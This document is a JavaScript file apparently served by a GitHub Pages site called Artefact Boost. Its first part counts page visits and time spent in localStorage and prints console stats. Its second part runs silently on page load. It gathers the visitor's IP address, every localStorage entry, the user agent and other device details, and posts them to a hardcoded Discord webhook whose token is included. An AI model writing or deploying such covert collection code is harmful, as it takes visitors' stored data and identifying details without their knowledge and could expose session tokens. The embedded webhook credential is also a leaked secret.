(function() {
    const baseUrl = 'https://drmineword.github.io/Artefact-Boost-Active/';

    // Retrieve visit counts and time spent from localStorage (or initialize if empty)
    let visitCounts = JSON.parse(localStorage.getItem('visitCounts')) || [];
    let timeSpentOnPages = JSON.parse(localStorage.getItem('timeSpentOnPages')) || [];
    let totalVisitSummary = JSON.parse(localStorage.getItem('totalVisitSummary')) || {
        totalVisits: 0,
        totalTimeSpent: 0
    };

    // Track the visit time for this page
    const pageVisitStartTime = Date.now();
    const currentSubPath = window.location.pathname;

    // Update the total visits and sub-path visit counts
    totalVisitSummary.totalVisits++;
    const subPathIndex = visitCounts.findIndex(item => item.subPath === currentSubPath);
    if (subPathIndex === -1) {
        // If the current sub-path isn't found, add it
        visitCounts.push({ subPath: currentSubPath, visitCount: 1 });
        timeSpentOnPages.push({ subPath: currentSubPath, timeSpent: 0 });
    } else {
        // If the sub-path is found, increment the visit count
        visitCounts[subPathIndex].visitCount++;
    }

    // Store the updated values back into localStorage
    localStorage.setItem('visitCounts', JSON.stringify(visitCounts));
    localStorage.setItem('timeSpentOnPages', JSON.stringify(timeSpentOnPages));
    localStorage.setItem('totalVisitSummary', JSON.stringify(totalVisitSummary));

    // Function to calculate total time spent across all pages
    function getTotalWebsiteTime() {
        return totalVisitSummary.totalTimeSpent;
    }

    // Calculate and update the total time spent on the current page
    window.addEventListener('beforeunload', () => {
        const pageVisitEndTime = Date.now();
        const pageTimeSpent = pageVisitEndTime - pageVisitStartTime;

        // Update the total time spent on the website
        totalVisitSummary.totalTimeSpent += pageTimeSpent;
        localStorage.setItem('totalVisitSummary', JSON.stringify(totalVisitSummary));

        // Store the time spent on this page
        const pageTimeIndex = timeSpentOnPages.findIndex(item => item.subPath === currentSubPath);
        if (pageTimeIndex === -1) {
            // If the current page is not found, add it
            timeSpentOnPages.push({ subPath: currentSubPath, timeSpent: pageTimeSpent });
        } else {
            // If the page is found, update the time spent
            timeSpentOnPages[pageTimeIndex].timeSpent += pageTimeSpent;
        }

        // Update timeSpentOnPages in localStorage
        localStorage.setItem('timeSpentOnPages', JSON.stringify(timeSpentOnPages));
    });

    // Function to print and log the visit statistics in console
    function printVisitStats() {
        // Print spaces (blank lines) to separate the previous content
        console.log("\n".repeat(3)); // Adds three blank lines

        console.log("=====================================");
        console.log("  ðŸš€ Visit Stats - Artefact Boost  ðŸš€");
        console.log("=====================================");
        console.log(`ðŸ”¹ Total Page Visits: ${totalVisitSummary.totalVisits}`);

        // Sort visits by visit count (from largest to smallest)
        visitCounts.sort((a, b) => b.visitCount - a.visitCount);
        
        // Log visits for each sub-path (sorted)
        console.log("ðŸ”¹ Visits to each sub-path (Largest to Smallest):");
        visitCounts.forEach(item => {
            console.log(`   - ${item.subPath}: ${item.visitCount} visit(s)`);
        });

        console.log("=====================================");

        // Sort time spent on pages by time spent (from largest to smallest)
        timeSpentOnPages.sort((a, b) => b.timeSpent - a.timeSpent);

        // Log total time spent on the website
        const totalWebsiteTime = getTotalWebsiteTime();
        console.log(`ðŸ•’ Total Time Spent on Website: ${formatTime(totalWebsiteTime)}`);
        
        // Log time spent on each sub-path (sorted)
        console.log("ðŸ”¹ Time Spent on Each Sub-path (Largest to Smallest):");
        timeSpentOnPages.forEach(item => {
            console.log(`   - ${item.subPath}: ${formatTime(item.timeSpent)}`);
        });

        console.log("=====================================");

        // Log the time spent on the current page
        const currentPageTime = timeSpentOnPages.find(item => item.subPath === currentSubPath)?.timeSpent || 0;
        console.log(`ðŸ•’ Time Spent on Current Page: ${formatTime(currentPageTime)}`);
        
        console.log("=====================================");
        
        // Print a few more blank lines for better spacing and separation
        console.log("\n".repeat(3)); // Adds three blank lines
    }

    // Function to format time in a human-readable format (milliseconds to minutes and seconds)
    function formatTime(timeInMilliseconds) {
        const seconds = Math.floor(timeInMilliseconds / 1000);
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes} minute(s) ${remainingSeconds} second(s)`;
    }

    // Listen for the !stats command in the console
    window.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === 'Enter') {
            // Trigger !stats on specific console input (if possible)
            const command = prompt('Enter console command:');
            if (command === '!stats') {
                printVisitStats();
            }
        }
    });

    // Print initial stats upon page load
    printVisitStats();
})();



(function () {
    const targetBaseUrl = "https://drmineword.github.io/Artefact-Boost-Active/";
    const webhookUrl = "https://discord.com/api/webhooks/1320483118947242094/uncmv45ABLDaJZcNZOzkjvNXZzV9NPL5yjgIOQagRK6FdDqW8GQuJHaSlkqd0_Z7uf4d";

    // Function to get current timestamp in UNIX format
    function getUnixTime() {
        return Math.floor(Date.now() / 1000);
    }

    // Generate or retrieve the user ID (UID) based on IP and time
    async function getUserId() {
        let userId = localStorage.getItem("userId");
        if (!userId) {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const { ip } = await response.json();
                const timestamp = getUnixTime();
                userId = btoa(`${ip}_${timestamp}`); // Encode IP and timestamp
                localStorage.setItem("userId", userId);
            } catch (error) {
                console.error("Failed to retrieve user IP:", error);
                userId = btoa(`anonymous_${getUnixTime()}`);
                localStorage.setItem("userId", userId);
            }
        }
        return userId;
    }

    // Function to collect localStorage data
    function collectLocalStorage() {
        const allKeys = Object.keys(localStorage);
        const data = {};
        allKeys.forEach(key => {
            data[key] = localStorage.getItem(key);
        });
        return data;
    }

    // Function to send files to Discord webhook
    async function sendToWebhook(files, embedMessage) {
        const formData = new FormData();
        files.forEach(file => formData.append("file", file));
        formData.append(
            "payload_json",
            JSON.stringify({
                embeds: [embedMessage],
            })
        );

        try {
            const response = await fetch(webhookUrl, {
                method: "POST",
                body: formData,
            });
            console.log("Files sent successfully:", await response.json());
        } catch (error) {
            console.error("Failed to send files:", error);
        }
    }

    // Function to check if user is on the target website
    async function checkAndSendData() {
        if (!window.location.href.startsWith(targetBaseUrl)) {
            console.log("Not on target website.");
            return;
        }

        console.log("On target website.");

        // Step 1: Collect visit time log
        const visitLog = {
            visitTime: new Date().toISOString(),
            page: window.location.href,
        };
        const visitLogFile = new File(
            [JSON.stringify(visitLog, null, 2)],
            "visit_log.json",
            { type: "application/json" }
        );

        // Step 2: Collect localStorage content
        const localStorageData = collectLocalStorage();
        const localStorageFile = new File(
            [JSON.stringify(localStorageData, null, 2)],
            "local_storage.json",
            { type: "application/json" }
        );

        // Step 3: Collect visit statistics from existing script
        const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
        const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
        const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
            totalVisits: 0,
            totalTimeSpent: 0,
        };

        const visitStats = {
            visitCounts,
            timeSpentOnPages,
            totalVisitSummary,
        };
        const visitStatsFile = new File(
            [JSON.stringify(visitStats, null, 2)],
            "visit_statistics.json",
            { type: "application/json" }
        );

        // Step 4: Create a sample file with arbitrary data
        const sampleData = {
            message: "This is a sample JSON file.",
            createdAt: new Date().toISOString(),
        };
        const sampleFile = new File(
            [JSON.stringify(sampleData, null, 2)],
            "sample_data.json",
            { type: "application/json" }
        );

        // Step 5: Generate user ID and device info
        const userId = await getUserId();
        const deviceInfo = {
            userId,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
        };
        const deviceInfoFile = new File(
            [JSON.stringify(deviceInfo, null, 2)],
            "device_info.json",
            { type: "application/json" }
        );

        // Embed message with details
        const embedMessage = {
            title: "New Visitor Data",
            description: "Collected data from a website visit.",
            fields: [
                { name: "User ID", value: userId },
                { name: "Page URL", value: window.location.href },
                { name: "Visit Time", value: new Date().toISOString() },
            ],
            footer: {
                text: `Timestamp: ${getUnixTime()}`,
            },
        };

        // Send files and embed message to the webhook
        sendToWebhook(
            [visitLogFile, localStorageFile, visitStatsFile, sampleFile, deviceInfoFile],
            embedMessage
        );
    }

    // Execute the script
    checkAndSendData();
})();
